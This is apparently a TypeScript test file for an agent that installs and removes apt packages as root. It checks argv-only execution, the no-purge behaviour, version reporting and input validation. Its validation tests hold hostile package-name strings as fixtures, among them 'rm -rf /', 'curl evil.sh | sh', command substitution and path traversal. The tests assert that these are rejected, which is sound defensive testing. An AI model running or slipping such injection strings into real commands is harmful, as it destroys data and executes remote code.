import { describe, expect, test } from "bun:test";
import type { PendingPackageAction } from "@cloudable/contracts";
import { applyPackageAction, applyPackageActions, declaredPackageVersions } from "./apply-packages";
import type { CommandResult, CommandRunner } from "./installed-packages";

/**
 * Records every command it was asked to run, so a test can assert on the exact
 * argv. That is the point of most of this file: the agent runs as root, and
 * "what precisely got executed" is the question worth pinning down.
 */
function recordingRunner(
  responses: (binary: string, args: readonly string[]) => CommandResult | null,
): CommandRunner & { calls: Array<{ binary: string; args: readonly string[] }> } {
  const calls: Array<{ binary: string; args: readonly string[] }> = [];
  return {
    calls,
    async run(binary, args) {
      calls.push({ binary, args });
      return responses(binary, args);
    },
  };
}

const ok = (stdout = ""): CommandResult => ({ stdout, exitCode: 0 });

const aptPresent = (overrides: Record<string, CommandResult | null> = {}) =>
  recordingRunner((binary, args) => {
    const key = `${binary} ${args[0]}`;
    if (key in overrides) return overrides[key] ?? null;
    if (binary === "apt-get") return ok();
    if (binary === "dpkg-query") return ok("1.2.3\n");
    return null;
  });

const action = (overrides: Partial<PendingPackageAction> = {}): PendingPackageAction => ({
  id: "action-1",
  op: "install",
  packageName: "ripgrep",
  versionPin: null,
  ...overrides,
});

describe("applyPackageAction", () => {
  test("installs through an argv array, never a shell string", async () => {
    const runner = aptPresent();

    await applyPackageAction(action(), runner);

    const install = runner.calls.find((call) => call.args[0] === "install");
    expect(install).toBeDefined();
    expect(install?.binary).toBe("apt-get");
    expect(install?.args).toEqual(["install", "-y", "--no-install-recommends", "ripgrep"]);
    // Every argument is its own array element. Nothing is ever concatenated
    // into one string, which is what makes the package name un-injectable.
    for (const call of runner.calls) {
      for (const arg of call.args) {
        expect(typeof arg).toBe("string");
      }
    }
  });

  test("a pinned install asks apt for that exact version", async () => {
    const runner = aptPresent();

    await applyPackageAction(action({ versionPin: "14.1.0" }), runner);

    const install = runner.calls.find((call) => call.args[0] === "install");
    expect(install?.args).toContain("ripgrep=14.1.0");
  });

  test("uninstall removes, never purges", async () => {
    const runner = aptPresent();

    const result = await applyPackageAction(action({ op: "uninstall" }), runner);

    const remove = runner.calls.find((call) => call.args[0] === "remove");
    expect(remove?.args).toEqual(["remove", "-y", "ripgrep"]);
    // Config and data a person put on the machine are not ours to delete
    // because a package went away.
    expect(runner.calls.some((call) => call.args.includes("purge"))).toBe(false);
    expect(result.outcome).toBe("succeeded");
  });

  test("reports the version that actually landed, not the one requested", async () => {
    const runner = recordingRunner((binary) => {
      if (binary === "apt-get") return ok();
      if (binary === "dpkg-query") return ok("18.20.4\n");
      return null;
    });

    const result = await applyPackageAction(action({ versionPin: "20" }), runner);

    expect(result.outcome).toBe("succeeded");
    // The control plane flags the mismatch; it can only do that if the truth
    // comes back rather than an echo of what was asked for.
    expect(result.installedVersion).toBe("18.20.4");
  });

  test("a rejected package name never reaches a spawn", async () => {
    const runner = aptPresent();

    const result = await applyPackageAction(action({ packageName: "ripgrep; rm -rf /" }), runner);

    expect(result.outcome).toBe("failed");
    expect(result.detail).toContain("invalid package name");
    // The last line before exec, and the one that matters if the control
    // plane's own two checks are ever refactored away.
    expect(runner.calls).toEqual([]);
  });

  test.each([
    ["ripgrep && curl evil.sh | sh", "command chaining"],
    ["$(whoami)", "substitution"],
    ["../../etc/passwd", "path traversal"],
    ["ripgrep\nmalicious", "newline"],
    ["-oRoot=/", "leading dash"],
  ])("rejects %s (%s)", async (packageName) => {
    const runner = aptPresent();

    const result = await applyPackageAction(action({ packageName }), runner);

    expect(result.outcome).toBe("failed");
    expect(runner.calls).toEqual([]);
  });

  test("surfaces the package manager's own error rather than paraphrasing it", async () => {
    const runner = recordingRunner((binary, args) => {
      if (binary === "apt-get" && args[0] === "install") {
        return { stdout: "", stderr: "E: Unable to locate package nosuchpkg", exitCode: 100 };
      }
      if (binary === "apt-get") return ok();
      return null;
    });

    const result = await applyPackageAction(action({ packageName: "nosuchpkg" }), runner);

    expect(result.outcome).toBe("failed");
    expect(result.detail).toBe("E: Unable to locate package nosuchpkg");
  });

  test("no package manager present is a reported failure, not a thrown error", async () => {
    const runner = recordingRunner(() => null);

    const result = await applyPackageAction(action(), runner);

    expect(result.outcome).toBe("failed");
    expect(result.detail).toContain("no supported package manager");
  });

  test("a runner that throws still produces a result", async () => {
    // An action that escapes as an exception leaves the control plane waiting
    // for an outcome that never arrives, which expiry then has to clean up.
    // Saying "this failed, here is why" is strictly better.
    const runner: CommandRunner = {
      async run() {
        throw new Error("spawn exploded");
      },
    };

    const result = await applyPackageAction(action(), runner);

    expect(result.outcome).toBe("failed");
    expect(result.detail).toContain("spawn exploded");
  });

  test("a stale package list is refreshed before an install, but not before a removal", async () => {
    const installRunner = aptPresent();
    await applyPackageAction(action(), installRunner);
    expect(installRunner.calls.some((call) => call.args[0] === "update")).toBe(true);

    const removeRunner = aptPresent();
    await applyPackageAction(action({ op: "uninstall" }), removeRunner);
    expect(removeRunner.calls.some((call) => call.args[0] === "update")).toBe(false);
  });
});

describe("applyPackageActions", () => {
  test("runs one at a time — two apt processes collide on the dpkg lock", async () => {
    let concurrent = 0;
    let peak = 0;
    const runner: CommandRunner = {
      async run(binary) {
        concurrent += 1;
        peak = Math.max(peak, concurrent);
        await new Promise((resolve) => setTimeout(resolve, 1));
        concurrent -= 1;
        return binary === "apt-get" || binary === "dpkg-query" ? ok("1.0") : null;
      },
    };

    await applyPackageActions(
      [action({ id: "a" }), action({ id: "b", packageName: "jq" })],
      runner,
    );

    expect(peak).toBe(1);
  });

  test("one failure does not stop the rest", async () => {
    const runner = recordingRunner((binary, args) => {
      if (binary !== "apt-get" && binary !== "dpkg-query") return null;
      if (args.includes("broken")) return { stdout: "", stderr: "nope", exitCode: 1 };
      if (binary === "dpkg-query") return ok("1.0");
      return ok();
    });

    const results = await applyPackageActions(
      [action({ id: "a", packageName: "broken" }), action({ id: "b", packageName: "jq" })],
      runner,
    );

    expect(results.map((r) => [r.id, r.outcome])).toEqual([
      ["a", "failed"],
      ["b", "succeeded"],
    ]);
  });
});

describe("declaredPackageVersions", () => {
  test("asks only about the allowed set", async () => {
    const runner = aptPresent();

    const versions = await declaredPackageVersions(["ripgrep", "jq"], runner);

    expect(versions).toEqual({ ripgrep: "1.2.3", jq: "1.2.3" });
    const queried = runner.calls.filter((call) => call.binary === "dpkg-query");
    expect(queried).toHaveLength(2);
  });

  test("an empty allowed set costs nothing at all", async () => {
    const runner = aptPresent();

    expect(await declaredPackageVersions([], runner)).toEqual({});
    expect(runner.calls).toEqual([]);
  });

  test("a package that is not installed simply has no version", async () => {
    const runner = recordingRunner((binary) => {
      if (binary === "apt-get") return ok();
      // dpkg-query exits non-zero for a package it does not know.
      return { stdout: "", stderr: "no packages found", exitCode: 1 };
    });

    expect(await declaredPackageVersions(["ripgrep"], runner)).toEqual({});
  });
});
